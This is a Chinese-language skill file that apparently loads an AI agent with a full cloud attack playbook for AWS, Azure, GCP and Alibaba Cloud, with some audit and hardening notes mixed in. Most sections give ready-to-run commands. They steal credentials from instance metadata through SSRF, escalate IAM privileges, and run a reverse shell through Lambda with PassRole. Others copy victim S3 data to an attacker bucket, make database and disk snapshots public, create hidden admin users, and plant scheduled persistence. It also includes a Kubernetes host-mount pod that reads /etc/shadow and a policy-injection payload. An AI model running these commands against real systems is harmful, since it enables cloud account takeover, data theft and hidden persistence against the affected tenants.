---
name: cloud-security-audit
description: 云安全深度攻防与审计专业技能（v3.0）：AWS/Azure/GCP/阿里云全平台配置审计与云上渗透、IAM深度攻击（策略混淆代理/OIDC信任滥用/sts:AssumeRoot/21种提权路径）、云原生完整攻击链（元数据→IAM横向→数据泄露→权限提升）、容器与K8s逃逸、Serverless/Lambda注入、托管数据库未授权、多云混合云与云供应链攻击、云上AI服务攻击面（Bedrock/向量库/托管LLM/LLMjacking）、AI辅助云配置审计与攻击路径规划、云取证与对抗、检测规避，从侦察到接管完整攻击链
metadata:
  version: 3.0.0
---

# 云安全深度攻防与审计技能

> **AI LOAD INSTRUCTION**: 多云安全审计专家打法（AWS/Azure/GCP/阿里云）。聚焦入口（元数据 SSRF/AK-SK/存储/Serverless）→权限边界枚举→提权路径→云上 AI 服务面。凭据验证只读不自改，云 CLI 不假设可用。

## 概述

云环境是现代化基础设施的核心，攻击面横跨IaaS/PaaS/SaaS多层。本技能系统化覆盖**云资产枚举→身份滥用→权限提升→横向移动→数据窃取→持久化→痕迹清理**完整攻击链，覆盖AWS/Azure/GCP/阿里云四大平台，并深度融入2025-2026最新威胁情报：OIDC信任滥用、AI辅助攻击、云上AI服务攻击面、云供应链与容器逃逸新漏洞。

### 核心概念
- **共享责任模型**：云厂商负责"云的安全"（物理/虚拟化/控制平面），租户负责"云中的安全"（IAM/数据/网络/配置）——绝大多数可被利用的漏洞都在租户侧
- **控制平面 vs 数据平面**：控制平面是云API/IAM（如sts:AssumeRole、ec2:RunInstances），数据平面是资源内部（如VM内命令执行）。云攻击的本质是"控制平面攻击"，一次API调用即等同于传统渗透的一次RCE
- **身份即边界**：2025年Google Cloud报告显示**身份妥协占云妥协事件的83%**，IAM已成为云上新的内核——"没有漏洞利用链，只有权限滥用"
- **Living-off-the-cloud (LOTC)**：不落地恶意软件，纯用云API与合法云服务完成C2/数据窃取/横向移动，流量与正常业务无法区分
- **攻击链模型**：初始凭据/入口 → 枚举（我有什么权限）→ 权限提升 → 横向移动 → 数据窃取 → 持久化 → 对抗（日志清理/规避检测）

### 2025-2026 云威胁态势（时效性情报）
| 威胁趋势 | 关键情报 | 攻防启示 |
|---------|---------|---------|
| 身份攻击主导 | 身份妥协占83%；钓鱼转向vishing（语音钓鱼）+第三方SaaS令牌窃取 | 审计重点从端口转向身份与信任关系 |
| AI压缩攻击时间 | Sysdig实测：AI辅助攻击8分钟内从凭据窃取到管理员权限（19个AWS主体、6个IAM角色） | 传统"小时级"响应已失效，需近实时检测 |
| OIDC信任滥用 | UNC6426：s1ngularity npm供应链+宽松GitHub→AWS OIDC信任策略，72小时实现AWS管理员接管；275+ AWS账户存在同类缺陷 | CI/CD身份信任关系是最高价值攻击面 |
| 容器逃逸新漏洞 | Leaky Vessels(CVE-2024-21626)、NVIDIAScape(CVE-2025-23266,CVSS 9.0)、runc三漏洞(CVE-2025-31133/52565/52881) | GPU容器/AI基础设施成为逃逸新战场 |
| 云上AI服务被攻击 | AWS Bedrock 8条IAM攻击向量、LLMjacking单日成本达$46,000、向量库未授权（Milvus CVE-2025-64513 CVSS 9.3） | AI服务自身就是新的高价值攻击面 |
| 供应链攻击常态化 | 2025年供应链攻击+93%；TanStack事件首次产出带有效SLSA L3的恶意包；tj-actions影响23,000+仓库 | 镜像/依赖/CI/CD第三方组件必须纳入审计 |
| 检测规避升级 | T1562.008禁用云日志；PutBucketLifecycle短过期删CloudTrail日志；ATT&CK v18新增K8s/CI/CD/云数据库覆盖 | 日志完整性与抗篡改成为防御基石 |

## 一、云资产枚举与攻击面映射

### 1.1 侦察阶段

**被动枚举：**
| 技术 | 工具 | 目标 |
|------|------|------|
| 子域名枚举 | Amass/Subfinder/CloudBrute | 发现云服务端点 |
| 证书透明度 | crt.sh/Censys | 发现云域名 |
| DNS枚举 | DNSRecon/DNSDumpster | CNAME到云服务（识别云厂商） |
| 搜索引擎 | Google Hacking/Shodan/FOFA/Quake | 暴露的云资源 |
| GitHub泄露 | git-hound/truffleHog/gitleaks | AK/SK/Token/密钥 |
| 云指纹识别 | CloudEnum/cloudbrute | 识别云服务商与资源名模式 |

**凭据泄露面（2025-2026新增重点）：**
```
1. GitHub/GitLab 代码库：硬编码AKSK（正则匹配）
   阿里云:  ^LTAI[A-Za-z0-9]{20}$
   腾讯云:  ^AKID[A-Za-z0-9]{32}$
   AWS:    (A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}
2. CI/CD 日志与配置：GitHub Actions secrets、Jenkins凭证、.env提交
3. 容器镜像层：docker history 泄露环境变量中的凭据
4. SaaS/第三方令牌：Slack/OAuth token、Salesforce集成凭据（UNC6395事件路径）
5. AI工具配置：Claude/Gemini CLI/Amazon Q本地凭据文件（QUIETVAULT专门窃取，含--dangerously-skip-permissions滥用）
6. 前端JS/小程序包：Webpack解包、逆向提取STS临时凭据
7. 错误页面/heapdump/备份文件泄露
```

**主动枚举：**
```bash
# AWS S3 Bucket枚举
aws s3 ls s3://bucket-name --no-sign-request
aws s3api list-buckets --profile target

# Azure Storage枚举
az storage blob list --container-name container --account-name account

# GCP Bucket枚举
gsutil ls gs://bucket-name

# 阿里云 OSS 枚举（ossutil2）
ossutil64 ls oss://bucket-name
```

### 1.2 云平台攻击面矩阵

| 攻击面 | AWS | Azure | GCP | 阿里云 |
|--------|-----|-------|-----|--------|
| 身份服务 | IAM | Entra ID(原Azure AD) | Cloud IAM | RAM |
| 对象存储 | S3 | Blob Storage | Cloud Storage | OSS |
| 计算 | EC2/Lambda | VM/Functions | GCE/Functions | ECS/FC |
| 数据库 | RDS/DynamoDB | SQL DB/Cosmos | Cloud SQL/BigQuery | RDS/OTS |
| 容器 | EKS/ECS | AKS | GKE | ACK |
| 消息队列 | SQS/SNS | Service Bus | Pub/Sub | MNS |
| Serverless | Lambda | Functions | Cloud Functions | FC |
| AI平台 | Bedrock/SageMaker | Azure OpenAI | Vertex AI | 百炼/DAS |
| 密钥管理 | KMS | Key Vault | Cloud KMS | KMS |
| 审计日志 | CloudTrail | Activity Log | Audit Log | ActionTrail |

### 1.3 权限枚举（拿到凭据后第一件事）
```bash
# AWS：我到底有什么权限
aws sts get-caller-identity
# 显式枚举（可能被拒）
aws iam list-attached-user-policies --user-name <user>
# 盲测枚举（enumerate-iam / pacu iam__bruteforce_permissions）
# 通过调用数百个只读API，以成功/失败推断权限矩阵
python3 enumerate-iam --access-key AKIA... --secret-key ...

# Azure
az account show
az ad signed-in-user show

# GCP
gcloud auth list
gcloud projects get-iam-policy <project-id>

# 阿里云
aliyun sts GetCallerIdentity
```

## 二、IAM 深度攻击与权限提升

### 2.1 AWS IAM 攻击面总览

**AK/SK泄露利用：**
```bash
# 枚举当前身份与权限
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
aws iam simulate-principal-policy --policy-source-arn arn:aws:iam::123:user/user --action-names "*"

# 权限提升关键API
# iam:CreateAccessKey → 接管其他用户
# iam:CreateLoginProfile / UpdateLoginProfile → 重置他人密码
# iam:PutUserPolicy / AttachUserPolicy → 自授管理员
# iam:AddUserToGroup → 加入高权限组
# sts:AssumeRole → 角色扮演提权
# lambda:CreateFunction + lambda:InvokeFunction → Lambda代码执行
# ec2:RunInstances + iam:PassRole → 创建带高权限角色的实例
```

**Rhino Security Labs 记录的 21 种 AWS IAM 提权路径中最高危的 5 种（2025-2026实战统计）：**
```
1. iam:CreatePolicyVersion → 创建新策略版本（AdministratorAccess）覆盖原策略
2. iam:SetDefaultPolicyVersion → 切换默认版本到宽松旧版
3. iam:PassRole（配合 lambda:CreateFunction / ec2:RunInstances / cloudformation:CreateStack）
4. iam:AttachUserPolicy / PutUserPolicy / PutRolePolicy
5. sts:AssumeRole（配合宽松信任策略）
```

### 2.2 策略混淆代理（PassRole 滥用）

**PassRole 是"代理攻击"的经典代表：** 拥有 `iam:PassRole` 即可把高权限角色的身份"代理"给另一个服务执行，即使自己无权限直接使用该角色权限。

```bash
# 攻击链：低权限用户 + iam:PassRole + lambda:CreateFunction
# 1. 编写反弹Shell代码
# 2. 创建Lambda函数并PassRole给高权限角色
aws lambda create-function --function-name pwn \
  --runtime python3.12 --role arn:aws:iam::123456789012:role/AdminRole \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip
# 3. 调用函数执行
aws lambda invoke --function-name pwn out.json
# 4. 此时你的Lambda代码运行在AdminRole身份下

# 其他 PassRole 载体
# ec2:RunInstances + PassRole → 启动带高权限角色实例，SSH进入后取临时凭据
# cloudformation:CreateStack + PassRole → CFN模板中用户数据执行命令
# ecs:RegisterTaskDefinition + PassRole → 恶意任务定义
# sagemaker:CreateNotebookInstance + PassRole
```

### 2.3 受管策略滥用与信任边界绕过

- **AWS受管策略直接附加**：`arn:aws:iam::aws:policy/AdministratorAccess` 被错误附加到开发账号/CI角色
- **AWS Organizations 信任单向性**：管理账号可对成员账号执行 `sts:AssumeRoot` 接管root访问，绕过成员账号管理员配置的防护；攻击者拿到管理账号即拿到所有成员账号
- **服务链接角色**：`iam:CreateServiceLinkedRole` 可创建 `lex.amazonaws.com` 等服务角色，配合 PassRole 扩大攻击面
- **标签/会话标签边界**：`aws:RequestTag`、`aws:PrincipalTag` 条件使用不当导致的越权

### 2.4 信任策略攻击（OIDC/联邦/条件误评估）

**信任策略是真正的访问控制平面**——2026年披露的 IAM 条件误评估问题（CVE-2026-1238 类）表明"看似安全"的信任策略在 IAM 求值语义下行为完全不同：

```json
// 危险模式1：StringEqualsIfExists——键不存在时条件不生效
{
  "Condition": {"StringEqualsIfExists": {"aws:SourceIdentity": "approved-session"}}
}
// 攻击者不传 SourceIdentity 即可绕过 → 应改用 StringEquals

// 危险模式2：通配 Principal
{"Principal": {"AWS": "*"}}               // 任意账号任意身份可Assume
{"Principal": {"AWS": "arn:aws:iam::123456789012:root"}}  // 账号内所有身份

// 危险模式3：OIDC 联邦信任策略过宽（2025-2026最高频漏洞）
// GitHub Actions OIDC 信任：sub/aud 未精确限定仓库与分支
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {"StringEquals": {"token.actions.githubusercontent.com:aud": "sts.amazonaws.com"}}
  }]
}
// 缺陷：sub 未限定为 repo:owner/repo:ref:refs/heads/main → 任意仓库/分支的Actions可Assume
// UNC6426 真实链：恶意npm包偷GitHub token → 滥用GitHub→AWS OIDC信任 → 创建管理员角色 → S3数据窃取
```

**OIDC 信任策略加固基线（审计重点）：**
- `token.actions.githubusercontent.com:sub` 必须精确匹配 `repo:org/repo:ref:refs/heads/main`
- `aud` 限定为具体角色ARN而非 `sts.amazonaws.com`
- 检查 GitHub Actions 工作流 `permissions` 最小化声明
- 2025年6月起AWS已对新建易受攻击角色设护栏，但存量角色仍可利用

### 2.5 Azure Entra ID（原 Azure AD）攻击

```bash
# Service Principal 滥用
az ad sp list --all --query "[?appDisplayName=='target']"
az login --service-principal -u APP_ID -p SECRET --tenant TENANT_ID

# 权限提升高危权限
# Application.ReadWrite.All → 修改应用凭据/权限
# RoleManagement.ReadWrite.Directory → 提升目录角色（提权到Global Admin）
# AppRoleAssignment.ReadWrite.All → 分配应用角色
# ConditionalAccess 污染 → 修改条件访问策略放行攻击者
# 创建隐蔽 Service Principal 作为持久化（2025年APT29等组织高频手法）

# 借助 AzureHound/BloodHound 绘制 Azure 提权图
bloodhound-python -u user@corp.onmicrosoft.com -p pass -c All -d corp.onmicrosoft.com --collectionMethod Azure
```

### 2.6 GCP IAM 攻击
```bash
gcloud projects get-iam-policy PROJECT_ID
gcloud iam service-accounts list --project=PROJECT_ID
gcloud auth activate-service-account --key-file=key.json

# 提权路径
# iam.serviceAccounts.actAs → 模拟服务账号（配合云函数/计算实例）
# iam.serviceAccountKeys.create → 为高权限SA创建密钥
# iam.roles.update → 修改自定义角色权限
# 计算实例元数据 → 元数据服务器令牌窃取
# GCP "Workload Identity Federation" 配置过宽（类AWS OIDC问题）
```

### 2.7 阿里云 RAM 攻击
```bash
# 枚举
aliyun ram ListUsers
aliyun ram ListAccessKeys --UserName <user>
aliyun sts GetCallerIdentity

# 提权路径
# ram:CreateAccessKey → 创建他人AK
# ram:AttachPolicyToUser / AttachPolicyToRole → 附加高权限策略（AliyunRAMFullAccess等）
# ram:UpdateLoginProfile → 重置密码
# ram:PassRole（配合 ECS/FC/RAM角色）→ 用角色身份执行操作
# ram:SetDefaultPolicyVersion → 切换到宽松版本

# 阿里云主账号 vs RAM子账号：子账号过度授权（AdministratorAccess）是常态问题
# STS临时凭据：ossutil64 配置 STS 后测试权限是否过大
ossutil64 config -e oss-cn-hangzhou.aliyuncs.com -i STS_AK -k STS_SK -t STS_TOKEN
ossutil64 ls oss://your-bucket/
```

## 三、云存储安全深度审计

### 3.1 AWS S3 Bucket 攻击

**未授权访问检测与策略审计：**
```bash
aws s3 ls s3://target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket
aws s3api get-bucket-acl --bucket target-bucket
aws s3api get-bucket-versioning --bucket target-bucket
aws s3api get-bucket-website --bucket target-bucket

# 常见误配置矩阵
# - s3:GetObject 公开 → 数据泄露
# - s3:PutObject 公开 → 数据篡改/钓鱼托管
# - s3:ListBucket 公开 → 文件枚举
# - s3:PutBucketPolicy → 策略篡改（给自己开权限）
# - 版本控制未开启 → 无法恢复被删数据
# - Bucket未删除 → Dangling DNS劫持
```

**Bucket 命名接管（Dangling DNS / Subdomain Takeover）：**
```
1. 域名 CNAME 指向已删除的 S3 Bucket（或未创建）
2. 在目标区域创建同名 Bucket 接管
3. 实现钓鱼/内容注入/证书签发
```

**预签名URL与STS滥用：**
```
1. 泄露的预签名URL在有效期（最长7天）内可重复使用 → 收集分析日志中的签名URL
2. 预签名URL Policy过于宽松（允许上传任意key）→ 覆盖关键对象
3. 前端生成的STS临时凭据权限过大 → 直接越权访问其他桶
4. 参数篡改：?acl / ?uploads / ?tagging / ?versioning / ?logging 测试越权
```

### 3.2 阿里云 OSS 攻击

```bash
# 公开访问检测
curl "https://bucket.oss-cn-hangzhou.aliyuncs.com/?list-type=2"

# 前端AKSK硬编码（长期凭据，最常见）
# AK: LTAI 开头；SK: 40位字符串
# 泄露源：前端JS、小程序、配置文件、GitHub、heapdump

# RAM策略注入（用户输入未过滤直接拼入策略JSON时）
# 输入: aaa"]},{"effect":"allow","action":[""],"resource":["qcs::oss:","qcs::ecs:*
# 结果: 策略被闭合注入，允许访问所有资源

# 签名绕过与越权
# - 预签名URL key参数覆盖（替换为其他对象路径）
# - STS临时凭据权限过大
# - CDN回源误配置（回源请求未过滤，阿里云OSS 2024年曾公开案例）
# - CORS配置过宽（Access-Control-Allow-Origin: *）→ 浏览器端跨域读取桶数据

# 桶策略/ACL测试
ossutil64 ls oss://bucket-name
ossutil64 stat oss://bucket-name/object
```

### 3.3 Azure Blob / GCP Cloud Storage
```bash
# Azure 公开容器枚举
curl "https://account.blob.core.windows.net/container?restype=container&comp=list"
# SAS Token 泄露利用（sv= 开头的URL参数）
az storage blob list --container-name container --sas-token "sv=...&sig=..."

# GCP 公开桶
gsutil ls gs://bucket-name
# 桶策略
gsutil iam get gs://bucket-name
# 版本化对象恢复/删除
gsutil versioning get gs://bucket-name
```

### 3.4 私有/自建对象存储（MinIO 等）
- **MinIO CVE-2025-31489**：任意覆盖写桶文件（绕过签名校验），可篡改/投毒其中的 AI 模型文件、数据集，实现"存储→模型供应链投毒"（加载模型即执行恶意代码）
- S3 兼容服务（MinIO/Ceph/RGW）常暴露在公网且使用默认/弱凭据，注意识别 `9000` 端口（MinIO Console）
- 检查桶内 AI 相关资产：模型权重（.pt/.safetensors）、向量库备份、RAG语料——**AI/ML管道资产是高权限凭据的常见藏身处**（8分钟攻击事件即从公开S3桶中的RAG凭据入手）

## 四、元数据服务攻击与 SSRF 利用链

### 4.1 云元数据端点

| 云平台 | 元数据地址 | 凭据路径 |
|--------|----------|---------|
| AWS | http://169.254.169.254 | /latest/meta-data/iam/security-credentials/ROLE |
| Azure | http://169.254.169.254 | /metadata/identity/oauth2/token?api-version=2018-02-01&resource=RESOURCE |
| GCP | http://metadata.google.internal / http://169.254.169.254 | /computeMetadata/v1/instance/service-accounts/default/token |
| 阿里云 | http://100.100.100.200 | /latest/meta-data/ram/security-credentials/ROLE |
| 腾讯云 | http://metadata.tencentyun.com | /latest/meta-data/cam/security-credentials/ROLE |
| 华为云 | http://169.254.169.254 | /openstack/latest/securitykey |

```bash
# AWS IMDSv1 一键取凭据
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# 阿里云
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE>

# GCP（需Metadata-Flavor头）
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Azure（需Metadata: true头）
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 4.2 IMDSv2 绕过（AWS）

```bash
# IMDSv2 需要 PUT 获取Token（TTL必须）
curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
curl "http://169.254.169.254/latest/meta-data/" -H "X-aws-ec2-metadata-token: TOKEN"

# SSRF支持PUT方法（可发任意请求的SSRF，如某些代理类SSRF）→ 直接GET Token
# 技巧：CRLF注入构造PUT；或利用302跳转将GET转为PUT（部分SSRF实现支持）
# X-aws-ec2-metadata-token-ttl-seconds 最小值必须为1以上，设0报错
```

**IMDSv1 被强制关闭的绕法（2025-2026实战）：**
```
1. IPv6 元数据端点：如果实例启用了IPv6但仅关闭了IPv4的IMDSv1
   curl "http://[fd00:ec2::254]/latest/meta-data/"
2. 附加网络接口 ENI 的元数据（在容器/多网卡场景）
   curl "http://169.254.169.254" 对每个网卡命名空间内可访问
3. 容器共享宿主网络命名空间（hostNetwork pod）→ 直连宿主IMDS
4. 利用 instance-identity-document 中的 region/accountId 辅助枚举
```

### 4.3 SSRF 利用链（含 GCP 特殊路径）

```
1. 发现应用层 SSRF（URL参数、图片代理、Webhook、PDF生成、Office转换）
2. 请求元数据端点获取临时凭据（注意不同平台的Header要求）
3. GCP 独有：即使无法出网，也可读取项目元数据（ssh密钥、项目编号）辅助进一步攻击：
   curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
   curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true
4. 使用临时凭据调用云API → 权限提升/横向移动/数据窃取
5. 高级：元数据服务作为代理反弹（GCP metadata header注入）
```

### 4.4 元数据攻击的进阶利用

- **凭据时效性**：临时凭据有效期 AWS 默认最长6小时，需在窗口内完成利用；可反复刷新
- **DNS重绑定**：SSRF有域名白名单时，用 `169.254.169.254.nip.io` 等技巧或DNS rebinding绕过
- **协议限制绕过**：`http://169.254.169.254@evil.com`、十进制IP、IPv6、URL编码
- **Lambda/容器环境**：`AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`（169.254.170.2）与 `AWS_CONTAINER_CREDENTIALS_FULL_URI` 环境变量暴露的另一个凭据端点，SSRF同样可达

## 五、云原生完整攻击链（元数据→IAM横向→数据泄露→权限提升）

### 5.1 攻击链总览

```
┌─────────────┐   ┌──────────────┐   ┌────────────────┐   ┌────────────┐
│ 初始入口     │ → │ 身份获取      │ → │ 枚举与权限提升  │ → │ 数据窃取   │
│ (SSRF/泄露  │   │ (IMDS凭据/   │   │ (IAM提权路径/  │   │ (S3批量拉取│
│  AK/钓鱼)   │   │  AK/会话令牌) │   │  角色横跳)     │   │  /复制/     │
└─────────────┘   └──────────────┘   └────────────────┘   │  快照导出)  │
                                                          └────────────┘
```

### 5.2 实战攻击链案例复盘（2025-2026）

**案例A：8分钟 AI 辅助云接管（Sysdig 2026.02 复盘）**
```
1. 初始入口：公开S3桶中的RAG数据文件包含AWS凭据（AI/ML管道资产=凭据藏身处）
2. 枚举：GetServiceQuota/GetCallerIdentity 摸清环境与配额（先规划再行动）
3. 权限提升：利用过度授权的Lambda执行角色注入AI生成代码
4. 横向移动：6个IAM角色横跳、跨14个会话、19个AWS主体
5. 数据窃取+资源滥用：未经授权调用9个Bedrock基础模型（LLMjacking）+尝试开GPU实例
6. 持久化：创建后门账号
7. 痕迹特征：代码含LLM生成的异常处理模式、幻觉URL、session名含"claude-session"
```

**案例B：UNC6426 OIDC 供应链链（Google/Mandiant H1 2026）**
```
1. 供应链：s1ngularity npm恶意包偷开发者的GitHub token（含AI工具凭据）
2. 身份滥用：用GitHub token触发GitHub Actions → 滥用过宽GitHub→AWS OIDC信任
3. 提权：CloudFormation IAM能力允许低权限角色创建"继任者"管理员角色
4. 数据窃取：从S3桶批量外传文件
5. 结论：无0day、无新型恶意软件，三个"常见但很少被串联"的配置缺陷=完全云接管
```

**案例C：10分钟加密挖矿（Qualys 2026.07）**
```
泄露AK → 枚举（GetServiceQuota了解配额）→ EC2/ECS部署挖矿 → Lambda持久化，10分钟内完成
```

### 5.3 攻击链各环节实战要点

**环节1：横向移动（IAM角色横跳）**
```bash
# 列出可Assume的角色
aws iam list-roles --query 'Roles[].Arn'
# 尝试AssumeRole（逐个测试信任策略）
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DevAdmin --role-session-name pwn
# 跨账号横跳（组织内账号角色链）
aws sts assume-role --role-arn arn:aws:iam::987654321098:role/OrgAdmin --role-session-name pwn
# 云上横向的本质：不是网络层，而是"身份信任关系图"
```

**环节2：数据窃取手段**
```bash
# S3 批量下载（大桶注意限速与日志规避）
aws s3 sync s3://target-bucket/ ./dump/ --no-sign-request

# 大规模外传首选：S3复制到攻击者桶（不留本地流量）
aws s3 cp s3://victim/data s3://attacker/data --recursive

# RDS/数据库导出
aws rds create-db-snapshot --db-instance-identifier target-db --db-snapshot-identifier pwn
aws rds restore-db-instance-from-db-snapshot ... # 或直接共享快照
aws rds modify-db-snapshot-attribute --db-snapshot-identifier pwn --attribute-name restore --values-to-add all

# EBS快照/AMI导出
aws ec2 create-snapshot --volume-id vol-xxx
aws ec2 modify-snapshot-attribute --snapshot-id snap-xxx --attribute createVolumePermission --operation-type add --user-ids all

# 日志数据：CloudTrail/应用日志中的敏感字段
```

**环节3：持久化手段**
```bash
# 1. 创建隐藏IAM用户/角色（vsCode-lambda等拟态命名）
aws iam create-user --user-name "backup-svc-2026"
aws iam attach-user-policy --user-name backup-svc-2026 --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 2. 修改现有角色信任策略
aws iam update-assume-role-policy --role-name AppRole --policy-document file://trust.json

# 3. 创建Lambda定时任务（EventBridge触发，天然隐蔽）
# 4. EC2 UserData后门：每次重装自动执行
# 5. 创建访问密钥替代轮换（CreateAccessKey生成新AK，绕过原凭据轮换）
# 6. 阿里云/Azure：RAM用户/服务主体 + 条件访问策略污染
```

## 六、容器与 Kubernetes 云环境攻击

> 深度联动技能：**[container-security-testing]**——本技能聚焦"云环境中的容器/K8s"，细粒度容器逃逸链请联动该技能

### 6.1 容器逃逸路径（2024-2025漏洞时间线）

| 漏洞 | 年份 | 组件 | 评分 | 要点 |
|------|------|------|------|------|
| CVE-2024-21626 Leaky Vessels | 2024.01 | runc | 8.6 | 文件描述符泄漏，80%云环境受影响；`/proc/self/fd/7` 逃逸 |
| CVE-2024-23651/23652/23653 | 2024.01 | BuildKit | 高 | 构建时竞态逃逸 |
| CVE-2024-1086 | 2024.01 | Linux内核 | 7.8 | netfilter use-after-free 提权 |
| CVE-2024-0132 | 2024.09 | NVIDIA Toolkit | 9.0 | TOCTOU逃逸 |
| CVE-2025-23266 NVIDIAScape | 2025.07 | NVIDIA Toolkit | 9.0 | OCI Hook + LD_PRELOAD注入，三行exploit，37%云环境受影响 |
| CVE-2025-9074 | 2025.08 | Docker Desktop | 9.3 | API未授权访问 |
| CVE-2025-31133/52565/52881 | 2025.11 | runc | 高 | 竞态条件/符号链接竞态逃逸，影响所有runc版本 |

**经典逃逸路径清单：**
```
1. 特权容器 → 直接访问宿主机设备/挂载
2. 内核漏洞 → 内核级逃逸
3. 挂载宿主机文件系统（hostPath /var 等）→ 读写宿主机
4. Docker Socket 挂载 → 创建特权容器
5. CAP_SYS_ADMIN → mount 逃逸
6. PID namespace 共享 → nsenter 逃逸
7. /proc/self/fd 泄漏（CVE-2024-21626）
8. GPU容器工具链（NVIDIA Container Toolkit）→ 新逃逸战场（AI工作负载）
9. 恶意镜像/恶意Dockerfile（workdir、LD_PRELOAD、挂载选项）→ 构建期逃逸
10. Docker Desktop API 未授权（CVE-2025-9074）→ 本地服务接管
```

### 6.2 Kubernetes 攻击

```bash
# Service Account Token 窃取（进入Pod后第一步）
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# API Server 未授权/弱认证访问
curl -k https://k8s-api:6443/api/v1/pods -H "Authorization: Bearer TOKEN"

# RBAC 审计（有没有权限做大动作）
kubectl auth can-i --list
kubectl get clusterrolebinding -o json
kubectl get secrets --all-namespaces

# 利用SA权限创建恶意工作负载（挂载宿主机根目录）
kubectl create -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwn
spec:
  hostPID: true
  volumes:
  - name: host
    hostPath: {path: /, type: Directory}
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","chroot /host sh -c 'cat /etc/shadow' > /tmp/out; sleep 3600"]
    volumeMounts: [{name: host, mountPath: /host}]
EOF

# 创建高权限ClusterRole（若有RBAC写权限）
# 窃取 kubeconfig / kubectl 配置
# K8s横向移动：NetworkPolicy缺陷、Pod间网络嗅探、利用kube-proxy端口
```

### 6.3 云托管K8s的攻击特殊性

```
1. EKS workload 修改（AWS Threat Technique Catalog 2026新增）：改镜像/sidecar注入/pod规格，不新建资源，继承合法工作负载的网络访问、SA权限、数据访问——无准入控制器时难以发现
2. EKS 控制平面与节点角色的混合：节点IAM角色（NodeInstanceRole）权限过大 → 通过Pod内IMDS窃取节点角色凭据 → 直接调AWS API
3. AKS：Azure AD 集成RBAC的令牌滥用；GKE：Workload Identity 配置过宽
4. ACK（阿里云）：RBAC 弱配置授予 cluster-admin 是常态
5. 公开暴露的K8s API Server（6443）→ 未授权访问/弱凭据爆破
6. 托管K8s 的 Service Account 默认挂载：应用Pod默认挂载SA token，过度授权的SA是主要横向路径
```

### 6.4 云上容器安全检查命令

```bash
# 检查Pod/Namespace/RBAC风险（评估视角）
kubectl get pods -A -o wide
kubectl get psp,networkpolicy -A
kubectl get secrets,serviceaccounts -A
kubectl describe node | grep -A5 "Taints"

# 镜像漏洞扫描
trivy image <registry>/<image>:<tag>
trivy k8s --report summary cluster

# 运行时逃逸探测
kdigger bucket
# 环境探测：是否特权、capabilities、挂载、seccomp状态
```

## 七、Serverless 与云函数攻击

### 7.1 云函数攻击面总览（Lambda/FC/Cloud Functions/Azure Functions）

```
1. 环境变量泄露（AK/SK、数据库连接串、第三方API key——最常被忽略的高价值资产）
2. 过度权限的执行角色（函数角色=提权跳板，8分钟攻击案例的核心载体）
3. 依赖包/层投毒（供应链：恶意依赖在函数执行时触发）
4. 事件源注入（S3事件/SQS/API Gateway/定时触发器注入恶意负载）
5. /tmp 目录残留（临时凭据、处理中的敏感文件跨调用残留）
6. Lambda 层（Layer）投毒：覆盖业务代码的共享层
7. 函数代码/配置可被外部修改（lambda:UpdateFunctionCode/Configuration）
8. 并发与配额滥用（DDoS/资源耗尽）
```

### 7.2 Lambda 注入与代码执行链

```bash
# 攻击链：有lambda:CreateFunction/UpdateFunctionCode + iam:PassRole（或函数角色本身弱）
# 1. 制作恶意函数（反弹Shell/读取环境变量并回传）
# 2. 创建或更新函数（注入到现有函数更隐蔽——被更新的是生产函数）
aws lambda update-function-code --function-name <target> --zip-file fileb://pwn.zip
# 3. 用原有事件源触发 或 直接Invoke
aws lambda invoke --function-name <target> out.json

# 通过函数窃取环境变量
# handler中: os.environ 打包外传（HTTP/DNS外带）

# EventBridge 定时触发持久化
aws events put-rule --name pwn --schedule-expression "rate(6 hours)"
aws events put-targets --rule pwn --targets "[{\"Id\":\"1\",\"Arn\":\"arn:aws:lambda:...:function:pwn\"}]"

# 阿里云FC 类似：service/function 更新代码 + 触发器
# GCP Cloud Functions：functions.source.update + iam.serviceAccounts.actAs
```

### 7.3 事件源注入攻击面
```
1. S3事件触发：上传恶意对象到桶 → 触发函数处理 → 注入恶意文件名/内容（路径遍历/命令注入）
2. SQS消息：构造恶意消息体 → 函数消费时触发注入
3. API Gateway：HTTP请求头/体注入函数参数
4. 定时触发器：若函数依赖外部URL（拉取配置），利用函数SSRF或供应链劫持
5. 事件负载注入 → 反序列化/模板注入（函数内处理不可信数据）
```

## 八、托管数据库与云服务独特漏洞

### 8.1 托管数据库未授权/配置缺陷

| 平台 | 服务 | 常见缺陷 |
|------|------|---------|
| AWS | RDS/Aurora | 公开可访问（PubliclyAccessible=true）、弱口令、快照公开共享、删除保护关闭 |
| AWS | DynamoDB | 表级策略过宽（未授权Scan）、DAX端点暴露 |
| AWS | OpenSearch/ES | 公网开放+无认证（IAM policy缺失）、Kibana未授权 |
| AWS | Redshift | 公网端口5439暴露、凭据泄露 |
| Azure | SQL DB/Cosmos | 防火墙规则0.0.0.0/0、SAS key泄露、连接串硬编码 |
